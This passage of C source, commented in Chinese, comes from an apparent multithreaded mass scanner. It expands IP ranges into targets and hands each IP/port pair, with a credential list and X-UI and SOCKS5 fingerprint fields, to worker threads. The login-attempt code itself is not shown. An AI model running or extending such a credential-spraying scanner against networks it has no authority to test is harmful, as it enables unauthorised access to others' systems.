        arg->cred_count = ctx->cred_count;
        arg->work_mode = g_config.mode;
        arg->xui_fingerprint_ok = -1;
        arg->s5_fingerprint_ok = -1;
        arg->s5_method = -1;

        MUTEX_LOCK(lock_stats);
        running_threads++;
        MUTEX_UNLOCK(lock_stats);

        #ifdef _WIN32
        _beginthreadex(NULL, 0, worker_thread, arg, 0, NULL);
        #else
        pthread_t tid;
        pthread_create(&tid, NULL, worker_thread, arg);
        pthread_detach(tid);
        #endif
    }

    ctx->fed_count++;

    if (ctx->enable_resume_skip) {
        int ins = target_set_add(ctx->resume_done, ip);
        if (ins == 1) {
            MUTEX_LOCK(lock_file);
            file_append(ctx->resume_checkpoint_file, ip);
            file_append(ctx->resume_checkpoint_file, "\n");
            MUTEX_UNLOCK(lock_file);
        }
    }

    if (ctx->enable_history_skip) {
        int ins = target_set_add(ctx->history_done, ip);
        if (ins == 1) {
            MUTEX_LOCK(lock_file);
            file_append(ctx->history_file, ip);
            file_append(ctx->history_file, "\n");
            MUTEX_UNLOCK(lock_file);
        }
    }

    if (g_config.feed_interval > 0.0f) {
        int ms = (int)(g_config.feed_interval * 1000.0f);
        if (ms < 1) ms = 1;
        saia_sleep(ms);
    }

    if (ctx->fed_count % 20 == 0 || ctx->fed_count == ctx->est_total) {
        MUTEX_LOCK(lock_stats);
        int rt = running_threads;
        uint64_t scanned = g_state.total_scanned;
        uint64_t found   = g_state.total_found;
        MUTEX_UNLOCK(lock_stats);
        printf("\r%s进度:%s %zu/%zu  线程:%d  已扫:%llu  命中:%llu   %s",
               C_CYAN, C_RESET, ctx->fed_count, ctx->est_total, rt,
               (unsigned long long)scanned,
               (unsigned long long)found,
               C_RESET);
        fflush(stdout);
        write_scan_progress(ctx, "running");
    }
    return (g_running && !g_reload) ? 0 : -1;
}

static int iterate_expanded_targets(const char *raw_target,
                                    int (*on_target)(const char *target, void *userdata),
                                    void *userdata) {
    if (!raw_target || !on_target) return -1;

    char target[256];
    strncpy(target, raw_target, sizeof(target) - 1);
    target[sizeof(target) - 1] = '\0';

    char *s = target;
    while (*s && isspace((unsigned char)*s)) s++;
    char *e = s + strlen(s);
    while (e > s && isspace((unsigned char)e[-1])) *--e = '\0';
    if (!*s) return 0;

    if (strchr(s, '/')) {
        char ip_part[128];
        strncpy(ip_part, s, sizeof(ip_part) - 1);
        ip_part[sizeof(ip_part) - 1] = '\0';
        char *slash = strchr(ip_part, '/');
        if (slash) {
            *slash = '\0';
            int prefix = atoi(slash + 1);
            struct in_addr a;
            if (prefix >= 0 && prefix <= 32 && inet_pton(AF_INET, ip_part, &a) == 1) {
                uint32_t net = ntohl(a.s_addr);
                uint32_t mask = (prefix == 0) ? 0u : (~0u << (32 - prefix));
                uint32_t network = net & mask;
                uint64_t total = (prefix == 32) ? 1ULL : (1ULL << (32 - prefix));
                uint32_t start = network;
                uint32_t end = (uint32_t)(network + (uint32_t)(total - 1));
                if (prefix < 31) {
                    start = network + 1;
                    end = network + total - 2;
                }
                if (end >= start) {
                    char ip_buf[INET_ADDRSTRLEN];
                    for (uint32_t v = start; v <= end; v++) {
                        struct in_addr out;
                        out.s_addr = htonl(v);
                        inet_ntop(AF_INET, &out, ip_buf, sizeof(ip_buf));
                        if (on_target(ip_buf, userdata) != 0) return -1;
                        if (v == UINT32_MAX) break;
                    }
                    return 0;
                }
            }
        }
    }

    if (strchr(s, '-')) {
        char left[128] = {0};
        char right[128] = {0};
        char *dash = strchr(s, '-');
        size_t l = (size_t)(dash - s);
        if (l >= sizeof(left)) l = sizeof(left) - 1;
        memcpy(left, s, l);
        left[l] = '\0';
        strncpy(right, dash + 1, sizeof(right) - 1);

        char *ls = left;
        while (*ls && isspace((unsigned char)*ls)) ls++;
        char *le = ls + strlen(ls);
        while (le > ls && isspace((unsigned char)le[-1])) *--le = '\0';
        char *rs = right;
        while (*rs && isspace((unsigned char)*rs)) rs++;
        char *re = rs + strlen(rs);
        while (re > rs && isspace((unsigned char)re[-1])) *--re = '\0';

        struct in_addr a, b;
        if (inet_pton(AF_INET, ls, &a) == 1 && inet_pton(AF_INET, rs, &b) == 1) {
            uint32_t start = ntohl(a.s_addr);
            uint32_t end = ntohl(b.s_addr);
            if (end >= start) {
                char ip_buf[INET_ADDRSTRLEN];
                for (uint32_t v = start; v <= end; v++) {
                    struct in_addr out;
                    out.s_addr = htonl(v);
                    inet_ntop(AF_INET, &out, ip_buf, sizeof(ip_buf));
                    if (on_target(ip_buf, userdata) != 0) return -1;
                    if (v == UINT32_MAX) break;
                }
                return 0;
            }
        }

        if (inet_pton(AF_INET, ls, &a) == 1) {
            int numeric = 1;
            for (const char *p = rs; *p; p++) {
                if (!isdigit((unsigned char)*p)) {
                    numeric = 0;
                    break;
                }
            }
            if (numeric) {
                int end_last = atoi(rs);
                uint32_t start = ntohl(a.s_addr);
                int start_last = (int)(start & 0xFFu);
                if (end_last >= start_last && end_last <= 255) {
                    uint32_t base = start & 0xFFFFFF00u;
                    char ip_buf[INET_ADDRSTRLEN];
                    for (int x = start_last; x <= end_last; x++) {
                        struct in_addr out;
                        out.s_addr = htonl(base | (uint32_t)x);
                        inet_ntop(AF_INET, &out, ip_buf, sizeof(ip_buf));
                        if (on_target(ip_buf, userdata) != 0) return -1;
                    }
                    return 0;
                }
            }
        }
    }

    return on_target(s, userdata);
}

// 启动扫描 — 流式展开 IP 段，逐个投喂线程池（对齐 DEJI.py iter_expanded_targets 逻辑）
void scanner_start_multithreaded(char **nodes, size_t node_count, credential_t *creds, size_t cred_count, uint16_t *ports, size_t port_count) {
    init_locks();
    printf("开始扫描... 总节点: %zu, 总端口: %zu\n", node_count, port_count);
    
    size_t node_idx = 0;
    
    while (g_running && !g_reload && node_idx < node_count) {
        // 压背控制
        if (g_config.backpressure.enabled) {
            backpressure_update(&g_config.backpressure);
            if (backpressure_should_throttle(&g_config.backpressure)) {
                saia_sleep(1000);
                continue;
            }
        }
        
        // 检查并发数
        MUTEX_LOCK(lock_stats);
        int current = running_threads;
        MUTEX_UNLOCK(lock_stats);
        
        if (current >= g_config.threads) {
            saia_sleep(100);
            continue;
        }
        
        // 创建任务
        for (size_t p = 0; p < port_count && g_running && !g_reload; p++) {
            worker_arg_t *arg = (worker_arg_t *)malloc(sizeof(worker_arg_t));
            strncpy(arg->ip, nodes[node_idx], sizeof(arg->ip) - 1);
            arg->port = ports[p];
            arg->creds = creds;
            arg->cred_count = cred_count;
            arg->work_mode = g_config.mode;
            arg->xui_fingerprint_ok = -1;
            arg->s5_fingerprint_ok = -1;
            arg->s5_method = -1;
            
            MUTEX_LOCK(lock_stats);
            running_threads++;
            MUTEX_UNLOCK(lock_stats);
            
            #ifdef _WIN32
            _beginthreadex(NULL, 0, worker_thread, arg, 0, NULL);
            #else
            pthread_t tid;
            pthread_create(&tid, NULL, worker_thread, arg);
            pthread_detach(tid);
            #endif
        }
        
        node_idx++;
        
        // 进度显示 (每 10 个节点或最后一个刷新一次)
        if (node_idx % 10 == 0 || node_idx == node_count) {
            MUTEX_LOCK(lock_stats);
            int rt = running_threads;
            uint64_t scanned = g_state.total_scanned;
            uint64_t found   = g_state.total_found;
            MUTEX_UNLOCK(lock_stats);
            printf("\r%s进度:%s %zu/%zu  线程:%d  已扫:%llu  命中:%llu   %s",
                   C_CYAN, C_RESET, node_idx, node_count, rt,
                   (unsigned long long)scanned,
                   (unsigned long long)found,
                   C_RESET);
            fflush(stdout);
        }
    }
    
    // 等待剩余线程
    while (1) {
        MUTEX_LOCK(lock_stats);
        int remaining = running_threads;
        MUTEX_UNLOCK(lock_stats);
        if (remaining <= 0) break;
        saia_sleep(500);
    }
    
    printf("\n扫描结束\n");
}

/*
 * scanner_start_streaming: 流式扫描 — 接受原始未展开的行列表，
 * 按空白拆分 target 后逐个调用 iterate_expanded_targets 直接产出单个 IP,
 * 产出即投喂线程池，不再构建整段 IP 的大数组。
 * 对应 DEJI.py 的 iter_expanded_targets + asyncio.Queue 机制。
 */
void scanner_start_streaming(char **raw_lines, size_t raw_count,
                             credential_t *creds, size_t cred_count,
                             uint16_t *ports, size_t port_count) {
    init_locks();

    MUTEX_LOCK(lock_stats);
    while (verify_head) {
        verify_task_t *next = verify_head->next;
        free(verify_head);
        verify_head = next;
    }
    verify_tail = NULL;
    verify_running_threads = 0;
    pending_verify_tasks = 0;
    feeding_in_progress = 0;
    snprintf(progress_token, sizeof(progress_token), "-");
    MUTEX_UNLOCK(lock_stats);

    /* 快速估算总目标数 — 不做真正展开，只算数目 */
    size_t est_total = 0;
    for (size_t i = 0; i < raw_count; i++) {
        if (!raw_lines[i] || !*raw_lines[i] || *raw_lines[i] == '#') continue;

        char line_copy[2048];
        strncpy(line_copy, raw_lines[i], sizeof(line_copy) - 1);
        line_copy[sizeof(line_copy) - 1] = '\0';
        char *saveptr = NULL;
        for (char *tok = SAIA_STRTOK_R(line_copy, " \t", &saveptr);
             tok;
             tok = SAIA_STRTOK_R(NULL, " \t", &saveptr)) {
            if (*tok == '#') break;
            est_total += estimate_expanded_count(tok);
        }
    }
    printf("开始扫描... 预估目标: %zu, 总端口: %zu\n", est_total, port_count);

    feed_context_t feed_ctx;
    feed_ctx.creds = creds;
    feed_ctx.cred_count = cred_count;
    feed_ctx.ports = ports;
    feed_ctx.port_count = port_count;
    feed_ctx.fed_count = 0;
    feed_ctx.est_total = est_total;
    if (!g_skip_cache_ready || g_state.total_scanned == 0) {
        target_set_free(&g_resume_cache);
        target_set_free(&g_history_cache);
        memset(&g_resume_cache, 0, sizeof(g_resume_cache));
        memset(&g_history_cache, 0, sizeof(g_history_cache));

        g_skip_cache_resume_enabled = 0;
        g_skip_cache_history_enabled = 0;

        if (g_config.resume_enabled && target_set_init(&g_resume_cache, 131071) == 0) {
            g_skip_cache_resume_enabled = 1;
        }

        if (g_skip_cache_resume_enabled) {
            char resume_file[MAX_PATH_LENGTH];
            snprintf(resume_file, sizeof(resume_file), "%s/resume_targets.chk", g_config.base_dir);
            load_target_set_file(resume_file, &g_resume_cache);
        }

        if (g_config.skip_scanned && target_set_init(&g_history_cache, 131071) == 0) {
            char history_file[MAX_PATH_LENGTH];
            snprintf(history_file, sizeof(history_file), "%s/scanned_history.log", g_config.base_dir);
            long long hsize = file_size_bytes(history_file);
            if (hsize >= 0 && hsize <= (20LL * 1024 * 1024)) {
                g_skip_cache_history_enabled = 1;
                load_target_set_file(history_file, &g_history_cache);
            } else {
                g_skip_cache_history_enabled = 0;
            }
        }

        g_skip_cache_ready = 1;
    }

    feed_ctx.resume_done = g_skip_cache_resume_enabled ? &g_resume_cache : NULL;
    feed_ctx.history_done = g_skip_cache_history_enabled ? &g_history_cache : NULL;
    feed_ctx.skipped_resume = 0;
    feed_ctx.skipped_history = 0;
    feed_ctx.enable_resume_skip = g_skip_cache_resume_enabled;
    feed_ctx.enable_history_skip = g_skip_cache_history_enabled;
    snprintf(feed_ctx.resume_checkpoint_file, sizeof(feed_ctx.resume_checkpoint_file), "%s/resume_targets.chk", g_config.base_dir);
    snprintf(feed_ctx.history_file, sizeof(feed_ctx.history_file), "%s/scanned_history.log", g_config.base_dir);
    snprintf(feed_ctx.progress_file, sizeof(feed_ctx.progress_file), "%s/scan_progress.dat", g_config.base_dir);
    feed_ctx.current_ip[0] = '\0';
    feed_ctx.current_port = 0;

    MUTEX_LOCK(lock_stats);
    feeding_in_progress = 1;
    MUTEX_UNLOCK(lock_stats);

    /* skip caches are preloaded once per audit session */
    write_scan_progress(&feed_ctx, "running");

    for (size_t li = 0; li < raw_count && g_running && !g_reload; li++) {
        const char *line = raw_lines[li];
        if (!line || !*line || *line == '#') continue;

        char line_copy[2048];
        strncpy(line_copy, line, sizeof(line_copy) - 1);
        line_copy[sizeof(line_copy) - 1] = '\0';
        char *saveptr = NULL;
        for (char *tok = SAIA_STRTOK_R(line_copy, " \t", &saveptr);
             tok && g_running && !g_reload;
             tok = SAIA_STRTOK_R(NULL, " \t", &saveptr)) {
            if (*tok == '#') break;
            if (iterate_expanded_targets(tok, feed_single_target, &feed_ctx) != 0) break;
        }
    }

    MUTEX_LOCK(lock_stats);
    feeding_in_progress = 0;
    MUTEX_UNLOCK(lock_stats);

    /* 等待剩余线程 */
    while (1) {
        scanner_pump_verify_workers();
        MUTEX_LOCK(lock_stats);
        int remaining = running_threads;
        int verifying = verify_running_threads;
        int queued = pending_verify_tasks;
        MUTEX_UNLOCK(lock_stats);
        if (remaining <= 0 && verifying <= 0 && queued <= 0) break;
        saia_sleep(200);
    }

    printf("\n扫描结束\n");
    const char *final_status = (g_running && !g_reload) ? "completed" : "stopped";
    if (g_running && !g_reload && feed_ctx.est_total > 0 && feed_ctx.fed_count == 0 &&
        (feed_ctx.skipped_resume > 0 || feed_ctx.skipped_history > 0)) {
        final_status = "completed_skipped";
    }
    write_scan_progress(&feed_ctx, final_status);

    if (feed_ctx.skipped_resume > 0 || feed_ctx.skipped_history > 0) {
        printf("跳过统计 -> resume:%d history:%d\n", feed_ctx.skipped_resume, feed_ctx.skipped_history);
    }

    /* keep skip caches alive across port batches */
}

// 占位符接口实现
int scanner_init(void) { return 0; }
void scanner_cleanup(void) {
    MUTEX_LOCK(lock_stats);
    while (verify_head) {
        verify_task_t *next = verify_head->next;
        free(verify_head);
        verify_head = next;
    }
    verify_tail = NULL;
    pending_verify_tasks = 0;
    verify_running_threads = 0;
    feeding_in_progress = 0;
    snprintf(progress_token, sizeof(progress_token), "-");
    MUTEX_UNLOCK(lock_stats);

    target_set_free(&g_resume_cache);
    target_set_free(&g_history_cache);
    memset(&g_resume_cache, 0, sizeof(g_resume_cache));
    memset(&g_history_cache, 0, sizeof(g_history_cache));
    g_skip_cache_ready = 0;
    g_skip_cache_resume_enabled = 0;
    g_skip_cache_history_enabled = 0;
}
// scanner_run 已经被新的逻辑替代，这里仅保留兼容性
int scanner_run(scan_target_t *target) { 
    (void)target;
    return 0; 
}
int scanner_scan_port(ip_port_t addr, scan_result_t *result) { (void)addr; (void)result; return 0; }
int scanner_scan_callback(scan_result_t *result, void *user_data) { (void)result; (void)user_data; return 0; }
